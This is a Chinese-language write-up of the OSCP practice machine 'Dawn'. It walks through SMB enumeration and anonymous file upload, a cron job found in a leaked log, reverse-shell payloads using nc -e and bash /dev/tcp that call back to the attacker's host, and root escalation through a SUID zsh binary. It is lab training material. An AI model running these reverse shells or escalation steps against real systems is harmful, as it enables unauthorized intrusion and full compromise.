# 原创
：  OSCP系列靶场-Esay-Dawn

# OSCP系列靶场-Esay-Dawn

### 总结

getwebshell → `SMB`共享无密码 → `SMB`存在上传功能 → 存在周期执行任务 → `SMB`上传反弹`shell` → 被执行获得`webshell`

提 权 思 路 → `suid`发现`zsh` → `-p`容器提权

### 准备工作

### 信息收集-端口扫描

#### 目标开放端口收集

通过两次收集到的端口:`→80,139,445,3306`

#### 目标端口对应服务探测

```
# tcp探测

sudo nmap -sT -sV -O -sC -p80,139,445,3306 192.168.242.11
```

### 信息收集-端口测试

```
80/tcp open http Apache httpd 2.4.38 ((Debian))</code>`445/tcp open netbios- Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)`<code>3306/tcp open mysql MySQL 5.5.5-10.3.15-MariaDB-1
```

首先思考445端口是否存在SMB共享内容，在思考3306端口是否存在弱口令，最后来挖掘80端口

#### 445-SMB端口的信息收集

##### 445-SMB是否无需密码探测(存在)

连接成功则SMB没有开启密码

```
# 利用-L查看SMB的内容

smbclient -L //192.168.242.11
```

发现`SMB`服务不需要密码即可访问，查看到了目录`ITDEPT`

##### 445-SMB文件信息收集​​​​​​​

```
# 利用获取到的[sambashare]直接进行访问查看内容

smbclient //192.168.242.11/ITDEPT -U root
```

查看了一下文件，没发现什么有用的内容

##### 445-SMB的上传(可能有用)​​​​​​​

```
# 利用获取到的sambashare直接进行访问之后尝试使用PUT是否成功

smbclient //192.168.242.11/ITDEPT -U root

smb :\ &gt; put [上传的文件]
```

尝试了上传功能，发现`SMB`的上传功能开启

##### 445-SMB用户名获取​​​​​​​

```
# 抓取用户名

enum4linux 192.168.242.11
```

抓着玩，先去干其他的

#### 3306-Mysql端口的信息收集

##### 3306-Mysql端口的默认脆弱口令测试(失败)

```
# 尝试直接使用mysql协议进行root:root尝试(远程需-h)

┌──(root㉿Kali)-[/home/bachang/Dawn]

└─# mysql -h 192.168.242.11 -uroot -proot

ERROR 1045 (28000): Access denied for user 'root'@'192.168.45.163' (using password: YES)
```

#### 80-HTTP端口的信息收集

访问 http://192.168.242.11/ 发现显示的是设备正在建设中，从源码步骤开始

##### 信息收集-源码查看

```
# 包括文章中是否写明一些敏感信息

curl http://192.168.242.11

# 利用html2text转换纯文本方便查看

curl http://192.168.242.11 | html2text
```

没什么有用的信息

##### 信息收集-目录扫描

###### 信息收集-目录扫描初步

如果扫描发现301适当考虑 -r 2 进行递归

```
dirsearch -u http://192.168.242.11 -x 302,403
```

因为扫出了目录，深层次的扫描待选
1.  `信息收集-目录扫描(后缀)` 1.  `信息收集-目录扫描(深度/大字典)` 1.  `信息收集-目录扫描(深度/大字典后缀)` 
##### 信息收集-端点查看

`/log`端点查看<br/> 发现该端点存在路径遍历

<br/> 访问了其中的内容，发现只有`management.log`可以查看

<br/> 下载之后进行查看，发现为系统内运行日志

###### 文件的信息收集

收集到了账户信息 `ganimedes`<br/> 在查看的过程中发现每分钟会执行重复的命令，在充满的命令中发现一些有趣的内容<br/> 确认了会周期性的执行给`777`的权限到对应的文件

<br/> 并且会执行

### 漏洞利用-getwebshell

##### SMB+计划执行突破

回到之前我们发现的SMB的文件夹发现是`ITDEPT`<br/> 和我们发现周期性日志中给`777`权的文件夹相同<br/> 推测可以将文件上传到`SMB`，等待执行获取反弹`shell`

###### 构造反弹shell的payload

确定我们需要上传的文件名为`web-control`，构造内容​​​​​​​

```
echo 'nc -e /bin/bash 192.168.45.163 4444' &gt; web-control

echo 'bash -i &gt;&amp; /dev/tcp/192.168.45.163/4444 0&gt;&amp;1' &gt; product-control
```

将文件上传到SMB中

攻击机开启监听

```
sudo nc -lvvp 4444
```

等待反弹shell的监听

成功反弹`shell`

### 内网遨游-getshell

#### 交互shell

##### 交互shell-python

由于获取的shell交互不友好，利用python获得新的交互shell​​​​​​​

```
# 利用python获取交互shell -&gt; python失败使用python3

python -c "import pty;pty.spawn('/bin/bash')";
```

#### FLAG1获取​​​​​​​

```
www-data@dawn:~$ find / -name local.txt 2&gt;/dev/null

/home/dawn/local.txt

cat /home/dawn/local.txt

*************************
```

#### 信息收集-内网基础信息收集

在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

##### 检测操作系统的发行版本​​​​​​​

```
# 确定发行版本

lsb_release -a
```

##### 查看内核版本信息​​​​​​​

```
# 确定内核版本

uname -a
```

##### 确认home目录下用户

```
# 发现了两个用户 和我们收集的一样

ls -al /home
```

###### 确认每个home目录下是否有隐藏文件(待定)​​​​​​​

```
# 例如.ssh找密码 ./*_history找历史记录等

ls -al /home/dawn
```

发现了隐藏的内容，先放一边，没思路就来

#### 权限提升

##### Linux提权-sudo提权尝试

查找具有`sudo`权限，且不需要密码的可提权文件​​​​​​​

```
# 利用sudo -l寻找

sudo -l
```

发现`sudo`的是`sudo`，不太能提权

#### Linux提权-suid提权尝试​​​​​​​

```
# -perm 文件权限

find / -perm -u=s -type f 2&gt;/dev/null
```

发现了`zsh`进行搜索

如果发现有东西的话 访问 https://gtfobins.github.io 寻找

<br/>`zsh`的提权其实与`bash`的类似

提权成功

#### FLAG2获取

```

cat /root/proof.txt

************************
```

<br/> 完结撒花~

> 
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.


**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/8e44779e75e84c318777ba998bd144fb.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/9bb65c4abed5455aac93df4efbba5aac.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/ce1d8e5177af4ba4ac024c48e29da316.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/d3d334ec075b41fbab81ed0b4bb9eb6a.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/b2262df18d0c401d854446cd2a3a11ff.png" width="665"/>

应急响应笔记

学习路线
